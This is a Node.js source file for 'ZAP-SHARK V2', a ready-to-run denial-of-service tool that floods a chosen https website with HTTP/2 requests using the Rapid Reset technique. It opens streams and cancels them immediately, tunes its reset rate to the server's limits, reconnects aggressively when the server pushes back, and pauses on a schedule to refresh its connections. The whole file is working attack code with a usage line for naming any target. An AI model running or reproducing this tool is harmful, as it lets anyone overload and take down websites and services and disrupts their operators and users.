const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');
const tls = require('tls');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // V2 ENHANCEMENTS
        this.connectionPool = [];
        this.poolSize = 5;
        this.activeStreams = 0;
        this.maxStreamsPerConn = 100;
        this.tlsSessionCache = new Map(); // TLS session reuse
        
        // RAPID RESET COUNTERS
        this.resetsPerSecond = 0;
        this.optimalResetRate = 100; // Auto-tuned
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.attackInterval = null;
        this.urlObj = new URL(targetUrl);
        this.targetIP = null; // DNS cache
    }

    async resolveDNS() {
        // Cache DNS once
        return new Promise((resolve) => {
            require('dns').resolve4(this.urlObj.hostname, (err, addresses) => {
                if (!err && addresses.length > 0) {
                    this.targetIP = addresses[0];
                }
                resolve();
            });
        });
    }

    setupConnections() {
        // TLS session reuse for faster handshakes
        const tlsOptions = {
            ALPNProtocols: ['h2'],
            servername: this.urlObj.hostname,
            session: this.tlsSessionCache.get(this.urlObj.hostname),
            enableTrace: false
        };

        // Add socket optimization
        const socketOptions = {
            allowHalfOpen: false,
            pauseOnConnect: false
        };

        for (let i = 0; i < this.poolSize; i++) {
            setTimeout(() => {
                try {
                    // Use raw IP if we have it (bypass DNS)
                    const connectTo = this.targetIP || this.urlObj.hostname;
                    
                    const client = http2.connect(this.targetUrl, tlsOptions, socketOptions);
                    
                    // Store TLS session for reuse
                    client.on('connect', () => {
                        const socket = client.socket;
                        if (socket && socket.getSession) {
                            try {
                                const session = socket.getSession();
                                if (session) {
                                    this.tlsSessionCache.set(this.urlObj.hostname, session);
                                }
                            } catch (e) {}
                        }
                    });
                    
                    client.setMaxListeners(1000);
                    
                    // SMART RAPID RESET DETECTION
                    client.on('remoteSettings', (settings) => {
                        this.maxStreamsPerConn = Math.min(
                            settings.maxConcurrentStreams || 100,
                            1000
                        );
                        
                        // Auto-tune reset rate based on server limits
                        this.optimalResetRate = Math.floor(this.maxStreamsPerConn * 0.8);
                    });
                    
                    client.on('goaway', (errorCode, lastStreamID) => {
                        // Server sent GOAWAY - implement rapid reset
                        if (errorCode === 0 || errorCode === 8) { // NO_ERROR or SETTINGS_TIMEOUT
                            // Reconnect faster after server tolerance
                            setTimeout(() => {
                                const idx = this.connectionPool.indexOf(client);
                                if (idx > -1) {
                                    this.connectionPool.splice(idx, 1);
                                    this.createOptimizedConnection();
                                }
                            }, 10); // Aggressive reconnect
                        }
                    });
                    
                    client.on('frameError', (frameType, errorCode) => {
                        // Handle frame errors silently
                    });
                    
                    client.on('error', () => {
                        // Silent reconnect
                        setTimeout(() => {
                            const idx = this.connectionPool.indexOf(client);
                            if (idx > -1) {
                                this.connectionPool.splice(idx, 1);
                                this.createOptimizedConnection();
                            }
                        }, 100);
                    });
                    
                    this.connectionPool.push(client);
                    
                } catch (err) {
                    // Don't break
                }
            }, i * 50); // Staggered
        }
    }

    createOptimizedConnection() {
        try {
            const tlsOptions = {
                ALPNProtocols: ['h2'],
                servername: this.urlObj.hostname,
                session: this.tlsSessionCache.get(this.urlObj.hostname)
            };
            
            const client = http2.connect(this.targetUrl, tlsOptions);
            client.setMaxListeners(100);
            client.on('error', () => {});
            this.connectionPool.push(client);
        } catch (err) {}
    }

    sendRequest() {
        if (this.connectionPool.length === 0) return;

        // SMART RAPID RESET TECHNIQUE
        const availableConnections = this.connectionPool.filter(c => 
            c && !c.destroyed && c.state && c.state.activeStreams < this.maxStreamsPerConn
        );

        if (availableConnections.length === 0) return;

        // Use connection with least active streams (load balancing)
        const client = availableConnections.reduce((prev, curr) => {
            const prevStreams = prev.state ? prev.state.activeStreams : 0;
            const currStreams = curr.state ? curr.state.activeStreams : 0;
            return currStreams < prevStreams ? curr : prev;
        });

        try {
            this.activeStreams++;
            
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ':authority': this.urlObj.hostname,
                'user-agent': 'Mozilla/5.0',
                'accept': '*/*'
            });
            
            // RAPID RESET: Send RST_STREAM immediately after request
            const resetDelay = Math.max(1, Math.floor(1000 / this.optimalResetRate));
            
            req.on('response', () => {
                // Optional: Could reset even on successful response
                if (this.resetsPerSecond < this.optimalResetRate) {
                    setTimeout(() => {
                        try {
                            req.close(http2.constants.NGHTTP2_CANCEL);
                            this.resetsPerSecond++;
                        } catch (e) {}
                    }, resetDelay);
                }
            });
            
            req.on('error', () => {
                // Count anyway
            });
            
            req.on('close', () => {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            });
            
            req.end();
            
            // Force reset if no response within timeout (aggressive)
            setTimeout(() => {
                try {
                    if (!req.destroyed) {
                        req.close(http2.constants.NGHTTP2_CANCEL);
                        this.resetsPerSecond++;
                    }
                } catch (e) {}
            }, 50);
            
        } catch (err) {
            this.activeStreams--;
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            
            // Auto-tune reset rate based on performance
            if (this.currentRPS < this.optimalResetRate * 0.7) {
                this.optimalResetRate = Math.max(10, Math.floor(this.optimalResetRate * 0.9));
            } else if (this.currentRPS > this.optimalResetRate * 1.3) {
                this.optimalResetRate = Math.min(1000, Math.floor(this.optimalResetRate * 1.1));
            }
            
            this.resetsPerSecond = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)}`);
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns >nul 2>&1', () => {});
        } else {
            exec('sudo dscacheutil -flushcache 2>/dev/null || true', () => {});
        }
    }

    flushSockets() {
        this.connectionPool.forEach(client => {
            try {
                client.destroy();
            } catch (err) {}
        });
        this.connectionPool = [];
        this.activeStreams = 0;
        this.tlsSessionCache.clear();
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            this.status = "PAUSED";
            
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                this.resolveDNS().then(() => {
                    this.setupConnections();
                    setTimeout(() => this.startAttack(), 1000);
                });
            }, this.maintenanceDuration);
        }
    }

    startAttack() {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                // Multiple attempts per tick for rapid fire
                for (let i = 0; i < 3; i++) {
                    this.sendRequest();
                }
                this.updateDisplay();
            }
        }, 0.1);
    }

    async start() {
        this.lastMaintenance = Date.now();
        
        console.log("=== ZAP-SHARK V2 ===");
        console.log("Smart Rapid Reset Enabled");
        console.log("TLS Session Reuse: ON");
        console.log("Target:", this.targetUrl);
        console.log("=".repeat(40));
        
        // Pre-resolve DNS
        await this.resolveDNS();
        
        this.setupConnections();
        
        setTimeout(() => {
            this.startAttack();
        }, 2000);
        
        // Auto-maintenance
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // Connection maintenance
        setInterval(() => {
            if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
                this.createOptimizedConnection();
            }
            
            // Clean dead connections
            this.connectionPool = this.connectionPool.filter(c => 
                c && !c.destroyed && c.closed === false
            );
        }, 5000);
        
        process.on('SIGINT', () => {
            this.running = false;
            if (this.attackInterval) clearInterval(this.attackInterval);
            this.flushSockets();
            console.log('\n=== ZAP-SHARK STOPPED ===');
            process.exit(0);
        });
    }
}

// Usage
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v2.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start();
